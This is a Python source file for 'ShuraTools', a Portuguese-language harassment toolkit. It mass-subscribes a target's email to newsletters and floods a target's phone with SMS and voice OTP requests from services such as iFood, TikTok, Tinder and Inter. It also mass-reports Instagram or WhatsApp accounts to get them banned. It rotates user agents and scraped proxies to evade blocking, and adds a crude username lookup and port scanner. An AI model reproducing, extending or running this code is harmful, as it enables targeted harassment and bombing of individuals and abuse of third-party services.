#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v5.5 Turbo-Arsenal (Inspired by Classic Bombers)
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install requests faker colorama")
    sys.exit(1)

# Banner ASCII estilizado - SHURA (Estilo Classic Bomber)
BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                       
{Fore.YELLOW}  [ SpamMail | SMS/Call | Social Ban | OSINT ]
{Fore.WHITE}      v5.5 Turbo-Arsenal Edition - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "turbo": Fore.CYAN + "[TURBO] ",
        "osint": Fore.MAGENTA + "[OSINT] "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Helpers ----------
def safe_int(prompt, default):
    try:
        val = input(prompt); return int(val) if val else default
    except: return default

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get(); PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def run_threads(target_func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=target_func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ---------- Database de Ataque v5.5 (Multi-Vector) ----------
def get_attack_payloads(type, target, msg=None):
    if type == "mail_custom":
        m = msg if msg else "Alerta de Seguranca Importante"
        return [
            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": m, "subject": "URGENTE"}},
            {"url": "https://www.newsletter.com/subscribe", "data": {"email": target, "action": "subscribe"}},
            {"url": "https://p.newsletter.vtex.com/subscribe", "data": {"email": target, "list": "netshoes"}}
        ]
    elif type == "mail_chato":
        return [
            {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", "data": {"action": "tnp", "na": "s", "ne": target, "ny": "on"}},
            {"url": "https://thenewscc.beehiiv.com/create", "data": {"email": target}},
            {"url": "https://investnews.beehiiv.com/create", "data": {"email": target}},
            {"url": "https://oalgoritmo.substack.com/api/v1/free_signup", "data": {"email": target}, "json": True}
        ]
    elif type == "sms_call":
        DD = target # Assume 55...
        return [
            {"url": "https://auth.ifood.com.br/v1/login/otp", "data": {"phone": DD}, "json": True},
            {"url": "https://api.quintoandar.com.br/v3/auth/send-otp", "data": {"phone": DD, "method": "VOICE"}, "json": True},
            {"url": "https://api.hapi.com/auth/send-code", "data": {"phone": f"+{DD}", "channel": "sms"}, "json": True},
            {"url": "https://www.tiktok.com/api/v1/auth/phone/send_code/", "data": {"mobile": DD}, "json": True},
            {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", "data": {"phone_number": DD}, "json": True},
            {"url": "https://api.inter.co/v1/auth/otp", "data": {"phone": DD, "type": "VOICE"}, "json": True} # Call do Inter
        ]
    return []

# ---------- Turbo Engine ----------
def turbo_attack(target, qty, threads, type, msg=None):
    log(f"Iniciando Módulo {type.upper()} contra: {target}", "turbo")
    payloads = get_attack_payloads(type, target, msg)
    
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                site = random.choice(payloads)
                headers = {"User-Agent": random.choice(UA_LIST), "Referer": site["url"]}
                
                if site.get("json"):
                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=12)
                else:
                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=12)
                
                if res.status_code < 300:
                    log(f"Hit {i+1} -> OK ({site['url'].split('/')[2]})", "success")
                else:
                    log(f"Hit {i+1} -> Block ({res.status_code})", "warn")
                
                time.sleep(random.uniform(0.5, 2.0))
            except:
                log(f"Hit {i+1} -> Timeout/Erro", "error")
                
    run_threads(job, qty, threads)

# ---------- Menu Industrial ----------
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 50)
            print(f"{Fore.RED}[ 1 ] EMAIL: Mensagem Customizada (Modo Spammer)")
            print(f"{Fore.RED}[ 2 ] EMAIL: Newsletters Massivas (Sites Chatos)")
            print(f"{Fore.RED}[ 3 ] BOMB: SMS + CALL (Chamada de Voz Otimizada)")
            print(f"{Fore.RED}[ 4 ] BAN: Mass Report (Instagram / WhatsApp)")
            print("-" * 50)
            print(f"{Fore.WHITE}[ 5 ] OSINT: Profile Discovery Hunter")
            print(f"{Fore.WHITE}[ 6 ] SCAN: Advanced Port Scanner")
            print(f"{Fore.YELLOW}[ 7 ] PROXY: Auto-Fetch & Rotate")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 50)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5", "6"]:
                target = input(f"{Fore.YELLOW}Target (Alvo): {Style.RESET_ALL}").strip()
                if not target: continue
                
                if opt == "1":
                    msg = input(f"{Fore.YELLOW}Message content: {Style.RESET_ALL}").strip()
                    turbo_attack(target, safe_int("Qty: ", 10), 5, "mail_custom", msg=msg)
                elif opt == "2": turbo_attack(target, safe_int("Qty: ", 30), 10, "mail_chato")
                elif opt == "3": turbo_attack(target, safe_int("Qty: ", 20), 4, "sms_call")
                elif opt == "4": 
                    type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                    # Re-usando lógica de report anterior
                    url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
                    def rjob(s, e):
                        for i in range(s, e):
                            try:
                                requests.post(url, data={"username":target}, timeout=5, headers={"User-Agent":random.choice(UA_LIST)})
                                log(f"Report {i+1} sent.", "success")
                            except: pass
                    run_threads(rjob, safe_int("Qty: ", 50), 10)
                elif opt == "5":
                    user = target.replace("@", "")
                    for n, u in {"IG": f"https://ig.me/{user}", "GH": f"https://github.com/{user}", "TT":f"https://tiktok.com/@{user}"}.items():
                        r = requests.get(u, timeout=5)
                        log(f"{n}: {'Found' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
                elif opt == "6":
                    host = target.split("@")[-1] if "@" in target else target
                    ip = socket.gethostbyname(host)
                    for p in [80, 443, 8080]:
                        s = socket.socket(); s.settimeout(0.8)
                        if s.connect_ex((ip, p)) == 0: log(f"Port {p} OPEN", "success")
                        s.close()
                
                input(f"\n{Fore.GREEN}Operation Completed. Press ENTER...{Style.RESET_ALL}")
            elif opt == "7":
                r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all")
                for line in r.text.splitlines():
                    if ":" in line: PROXY_QUEUE.put(line.strip())
                log(f"{PROXY_QUEUE.qsize()} Proxies Loaded!", "success"); input("\nENTER...")
                
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Kernel Panic: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
